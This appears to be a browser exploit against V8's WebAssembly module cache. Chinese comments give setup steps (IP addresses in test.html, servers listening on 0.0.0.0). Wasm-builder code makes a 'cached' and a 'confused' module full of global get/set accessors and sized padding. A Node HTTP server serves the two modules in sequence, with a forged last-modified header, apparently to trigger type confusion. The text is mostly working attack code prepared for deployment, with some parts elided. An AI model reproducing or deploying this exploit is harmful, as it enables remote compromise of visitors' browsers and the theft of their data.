// 需要修改的地方：
// 1. test.html中的ip地址，一共3处
// 2. server.js中监听0.0.0.0
// 3. server.py中监听0.0.0.0
...
function get_cached_module(padding_num){
  var builder = new WasmModuleBuilder();
  
  var wasm_global_array = [];
  var global_num = 0x200;
  for(var i = 0; i < global_num; i++){
      var g = builder.addGlobal(kWasmI32, true);  // better use I64 ?
      wasm_global_array.push(g);
  }

  var sig_v_i = builder.addType(kSig_v_i);
  var sig_i_i = builder.addType(kSig_i_i);
  var sig_i_v = builder.addType(kSig_i_v);
  var sig_v_iii = builder.addType(kSig_v_iii);

  var moo_idx = builder.addImport("q", "moo", sig_v_i);
  var demo_func_body = [
      // kExprLocalGet, 0,
      // kExprLocalGet, 1,
      kExprLocalGet, 2,
  ...
  builder.addFunction(`demo`, sig_v_iii)
      .addBody(demo_func_body)
      .exportAs(`demo`);
  ...
  for (var j = 0; j < padding_num; j++) { 
      large_func_body.push(kExprI32Const);
      large_func_body.push(0x41);
      large_func_body.push(kExprI32Add);
  }
  builder.addFunction(`padding`, sig_i_i)
      .addBody(large_func_body)
      // .exportAs(`padding`);
  


  var global_get_func_body;
  for(var i = 0; i < global_num; i++){
      global_get_func_body = [
          kExprGlobalGet, ...wasmSignedLeb(i)
      ];
      var tmp = builder.addFunction(`get_${i}`, sig_i_v)
          .addBody(global_get_func_body);
      // if(i < 0x100){
          tmp.exportAs(`get_${i}`);
      // }
  ...
  var global_set_func_body;
  for(var i = 0; i < global_num; i++){
      global_set_func_body = [
          kExprLocalGet, 0,
          kExprGlobalSet, ...wasmSignedLeb(i)
      ];
      var tmp = builder.addFunction(`set_${i}`, sig_v_i)
          .addBody(global_set_func_body)
  ...
  // %DebugPrint(builder.toBuffer().byteLength);
  return builder.toBuffer();
}

function get_confused_module(padding_num){
  var builder = new WasmModuleBuilder();
  ...
  builder.addFunction(`demo`, sig_v_i)
      .addBody(demo_func_body)
      .exportAs(`demo`);
  ...
  // builder.addFunction(`padding2`, sig_i_v)
  //     .addBody([
  //         kExprI32Const, 0x41
  //     ])
  //     .exportAs(`padding2`);
  ...
  for(var i = 0; i < 0x200; i++){
      ...
      builder.addFunction(`get_${i}`, sig_i_v)
          .addBody(global_get_func_body)
          .exportAs(`get_${i}`);
  }
  ...
  for(var i = 0; i < 0x200; i++){
      ...
      builder.addFunction(`set_${i}`, sig_v_i)
          .addBody(global_set_func_body)
          .exportAs(`set_${i}`);
  }
...
http.createServer(async function (req, res) {
    ...
    if(req.url == "/favicon.ico" || req.url == "/"){
        ...
        var wasm_data;
        console.log("g_count = " + g_count);
        if(g_count == 2){
            res.writeHead(200, {'Content-Type': 'application/wasm', 'last-modified': 'Sun, 27 Sep 2020 08:29:06 GMT'});
            wasm_data = get_cached_module(0x3000 - 0x3b0 - 3);
            res.write(Buffer.alloc(wasm_data.byteLength, wasm_data));
        }else{
            res.writeHead(200, {'Content-Type': 'application/wasm'});

            wasm_data = get_confused_module(0x3000 - 0x3b0 - 3);
            res.write(Buffer.alloc(wasm_data.byteLength, wasm_data));
            g_count += 1;
        }
        res.end();
